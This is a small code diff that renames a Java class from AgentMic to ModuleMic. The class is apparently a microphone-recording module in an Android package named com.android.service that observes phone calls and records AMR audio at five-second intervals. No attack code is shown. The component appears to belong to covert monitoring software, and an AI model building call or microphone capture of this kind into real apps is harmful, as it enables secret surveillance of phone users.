@@ -41,9 +41,9 @@ import com.android.service.util.Utils;
  * 
  * @author zeno
  */
-public class AgentMic extends BaseModule implements Observer<Call>, OnErrorListener, OnInfoListener {
+public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorListener, OnInfoListener {
 
-	private static final String TAG = "AgentMic"; //$NON-NLS-1$
+	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 
